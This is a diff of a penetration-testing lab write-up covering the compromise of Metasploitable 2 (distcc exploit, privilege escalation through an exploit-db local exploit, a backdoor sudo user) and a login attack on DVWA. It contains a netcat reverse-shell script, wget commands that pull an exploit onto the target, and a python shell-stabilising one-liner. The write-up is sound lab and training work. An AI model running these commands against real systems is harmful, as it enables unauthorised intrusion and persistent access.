@@ -16,13 +16,9 @@
 
 ​	Kali Linux 2 is installed on the attacking machine, and has been updated to the latest release of the operating system and tools.
 
-
-
 <u>**Topology**</u>
 
 ![Topology](/Topology.png)
-
-
 
 | target                                                       | target2                                        | kali                                | nessus                                                       |
 | ------------------------------------------------------------ | ---------------------------------------------- | ----------------------------------- | ------------------------------------------------------------ |
@@ -36,9 +32,7 @@
 
 ​	This is a virtual machine imported into a vSphere infrastructure of [Metasploitable](https://information.rapid7.com/download-metasploitable-2017.html).  Metasploitable is an intentionally vulnerable Linux machine designed for Penetration Testing.  The goal for this target will be to explore some of the more interesting vulnerabilities included in this distribution (specifically because there are some very quick and easy attack vectors available throughout this project).
 
- 
-
-##### A) Enumeration
+#####  A) Enumeration
 
 ##### 192.168.1.209
 
@@ -77,19 +71,19 @@
 | 8180/tcp  | open  | http        | Apache Tomcat/Coyote JSP engine 1.1 |
 | 8787/tcp  | open  | drb         | Ruby DRb RMI                        |
 
-​	There are many open ports with at first glance looks like many different attack vectors.  In order to help decide where to start, we scan once more with Nmap, this time using the "--script=VULN" parameter.  This will apply a set of scripts to the machine that will attempt to identify known vulnerabilites.
+​	There are many open ports with at first glance looks like many different attack vectors.  In order to help decide where to start, we scan once more with Nmap, this time using the "--script=VULN" parameter.  This will apply a set of scripts to the target that will scan and identify known vulnerabilites.
 
-​	One vulnerability that I hadn't seen before was the "distccd" service on port 3632/TCP.  Distcc, or distributed C/C++ compiler, is a platform that speeds up the compilation of C and C++ programs by using resources across a network.  This was used in a time in which computer systems were much slower, and compiling a C program could take hours or even days.
+​	One interesting potential exploit targets the "distccd" service on port 3632/TCP.  Distcc, or distributed C/C++ compiler, is a platform that speeds up the compilation of C and C++ programs by sharing resources across a network.  This was used back when computers were much slower on average, and compiling a C program could take hours or even days on a single machine.
 
 ##### B) Exploiting distcc using Armitage
 
-​	On examination of the Metasploit module [source code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/misc/distcc_exec.rb), I will use Armitage to simplify the process instead of developing a new exploit. 
+​	On examination of the Metasploit module [source code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/misc/distcc_exec.rb), we use Armitage to simplify the search for the specific exploit. 
 
 ![login](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/armsetup.PNG)
 
 ![login](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/shell.PNG)
 
-​	We now have a basic shell under the user "daemon".  Next we will stabilize our shell (make it a full fledged TTY interface).  With a guess that python was installed, I stabilized with a one-liner of python code
+​	We now have a basic shell under the user "daemon".  This user does not have root permissions, so there is more work to do.  Next we stabilize our shell (convert it into a full fledged TTY interface).  With a guess that python was installed, we accomplish this with a one-liner of python code.
 
 ```python
 python -c ‘import pty; pty.spawn(“/bin/sh”)’
@@ -97,11 +91,11 @@ python -c ‘import pty; pty.spawn(“/bin/sh”)’
 
 ![login](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/stable.PNG)
 
-​	The next step is to escalate our privileges to root.  
+​	Now we move on to the process of escalating our privileges.  
 
 ##### C) Obtaining root access
 
-​	We will switch back to the console driven msfconsole, and rerun our exploit to obtain a better terminal experience.  By executing the following lines on our terminal, we can find some valuable information about the system.
+​	We will open the console version of the metasploit framework, msfconsole, and rerun our exploit to obtain a more feature-rich terminal experience. After reconnecting to our reverse shell, we run some basic commands to find some system information.
 
 ```bash
 uname -a
@@ -110,15 +104,15 @@ lsb_release -a
 
 ![login](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/uname.PNG)
 
-​	After using searchsploit to research, I decided on a privilege escalation method found [here](https://www.exploit-db.com/exploits/8572).  First, we download the exploit source code and save it as "8572.c".  Then we create a new file, "run
-", and insert and save the following code:
+​	After a search through exploitdb, we decide on a privilege escalation method found [here](https://www.exploit-db.com/exploits/8572).  First, we download the exploit source code and save it as "8572.c".  Then we create a new file named "run
+" and populate the file with the following bash script:
 
 ```bash
 #!/bin/bash
 nc 192.168.1.210 12345 -e /bin/bash
 ```
 
-​	We save this, and start up the Python simple.http server with port 8080 on our attack box in the folder.  On the target, we execute the following to download our exploit and payload.
+​	We save this, and start up the Python simple.http server with port 8080 on our attack box.  On the target, we execute the following to download our exploit and payload.
 
 ```bash
 cd /tmp
@@ -126,7 +120,7 @@ wget http://192.168.1.210:8080/run
 wget http://192.168.1.210:8080/8572.c
 ```
 
-​	Then we compile the C code on the target machine into an executable file.
+​	Then we compile the C code of our exploit on the target machine into an executable file.
 
 ```bash
 gcc -o exploit 8572.c
@@ -176,7 +170,7 @@ Success!  We have admin credentials!
 
 ##### D. Creating a root user
 
-​	We will now create a new sudo user, with our own credentials.  Using visudo, we see that sudo users in this system are members of the "admin", and does not have a "sudo" or "root" group created.  We add a user and then add it to the correct group.
+​	We will now create a new sudo user, with our own credentials.  Using visudo, we see that sudo users in this system are members of the "admin" group, and the system does not have a "sudo" or "root" group created.  We add a user and then add it to the admin group.
 
 ```bash
 sudo adduser jjay1288
@@ -187,54 +181,48 @@ sudo usermod -aG admin jjay1288
 
 ##### E) Conclusion
 
-​	This machine was understandably riddled with attack vectors.  Many of the attack vectors found on this server are due specifically to outdated and unpatched software.  The distribution is way out of date, and the ability to connect to ubuntu repositories has been intentionally disabled.
-
-
+​	This machine was, as we assumed, riddled with attack vectors.  Many of the ones found on this server are specifically related to outdated and unpatched software.  The distribution is way out of date, and the ability to connect to ubuntu repositories has been intentionally disabled.
 
 
 
 #### III. Target 2: Damn Vulnerable Web Application (DVWA)
 
-​	This machine is running the latest Ubuntu (21.04), and has had [Damn Vulnerable Web App](https://dvwa.co.uk/) installed in its default configuration.  DVWA is an intentionally vulnerable web stack that has built in attack vectors.
-
-
+​	This machine is running the latest release of Ubuntu (21.04), and has [Damn Vulnerable Web App](https://dvwa.co.uk/) installed in its default configuration.  DVWA is an intentionally vulnerable web stack that has built in vulnerabilities for testing and training purposes.
 
 ##### A) Enumeration
 
 ##### 192.168.1.210
 
-​	Once again, I will start with a default script scan on the target through Nmap.  The results can be found [here](https://github.com/jjay1288/netattacksproj/blob/main/target2/scans/nmapinitial). This time, the results are drasticly different. 
+​	Once again we start with a default script scan on the target through Nmap.  The results can be found [here](https://github.com/jjay1288/netattacksproj/blob/main/target2/scans/nmapinitial). These results are drastically different. 
 
 | Port   | State | Service | Version                         |
 | ------ | ----- | ------- | ------------------------------- |
 | 22/tcp | open  | ssh     | OpenSSH 8.4p1 Ubuntu 5ubuntu1.1 |
 | 80/tcp | open  | http    | Apache httpd 2.4.46             |
 
-​	We find only two ports, SSH on 22 and http on 80.  Obviously this is a web server, and must enumerate on the machine through other means.  Navigating to http:\\\192.168.1.210 in the browser presents us with a login screen:
+​	We find only two ports, SSH on 22 and http on 80.  Obviously this is a web server, and must explore the machine through other methods.  Navigating to http:\\\192.168.1.210 in the browser presents us with a login screen:
 
 ​											![login](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/login.PNG) 
 
-​	The next step is to find out if there are any interesting directories on this web app.  We will start a  [DirBuster](https://www.kali.org/tools/dirbuster/) loaded with the directory-list-medium that comes in kali and scan. The results of this scan can be found [here](https://github.com/jjay1288/netattacksproj/blob/main/target2/scans/DirBusterReport-192.168.1.210-80.txt).  Dirbuster does this by tracking responses from the web server.  A "Not Found" reply means nothing exists there, while "Permission Denied" will indicate that the directory exists.
-
-
+​	The next step is to identify any interesting directories on this web app.  We start a [DirBuster](https://www.kali.org/tools/dirbuster/) scan configured with the directory-list-medium that comes by default in kali. The results of this scan can be found [here](https://github.com/jjay1288/netattacksproj/blob/main/target2/scans/DirBusterReport-192.168.1.210-80.txt).  Dirbuster does this by tracking responses from the web server.  A "Not Found" reply means nothing exists there, while "Permission Denied" or "OK" will indicate that the directory exists.
 
 ##### B) Attacking the login page
 
-​	The first step in attacking this machine is to get past the login page.  We must login to enumerate further.  For now, we can only infer that pages exist based on the return code of the dirbuster requests.  The first step is to have a look at the source code of [login.php](https://github.com/jjay1288/netattacksproj/blob/main/target2/loginpage/source.txt).
+​	The first step in attacking this machine is to get past the login page because for now we can only infer that pages exist based on the return code of the dirbuster requests.  The first step is to have a look at the source code of [login.php](https://github.com/jjay1288/netattacksproj/blob/main/target2/loginpage/source.txt).
 
-​	Immediately we see the fields for username and password, and we also see something that appears to be an anti-CSRF token:
+​	Immediately we see the fields for username and password, and we also see what appears to be an anti-CSRF token:
 
 ```html
 <input type='hidden' name='user_token' value='b57304890574bb9053c0c4f48d307773' />
 ```
 
-​	These types of tokens are meant to prevent Cross Site Request Forgeries by ensuring that the client that is requesting or posting http content to the site is the same one that opened the initial connection.  The web app will generate a random token and present it to the client on the first load of login.php.  
+​	These types of tokens are meant to prevent cross-site request forgeries by ensuring that the client that is requesting or posting http content to the site is the same client that opened the initial connection.  The web app will generate a random token and present it to the client on the initial load of login.php.  
 
 Using Burp Suite to proxy the http requests, you can see that the initial connection will also return a response from the server setting up a cookie:
 
 ![cookie](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/setcookie.PNG)
 
-​	My initial instinct is that the basic security feature at play here is a server-side check to compare the PHPSESSID to the user_token.  Using Burp to intercept the traffic, we confirm this is the case.
+​	My initial instinct is that the page uses a server-side check to compare the PHPSESSID to the user_token.  Using Burp to intercept the traffic, we confirm this is the case.
 
 ![post](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/post.PNG)
 
@@ -317,8 +305,6 @@ And we have our login credentials!
 I guess this Brute Force section would have been much easier to exploit.
 
 ![postresult](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/easy.PNG)
-
-
 
 ##### C. Obtaining a reverse shell
 
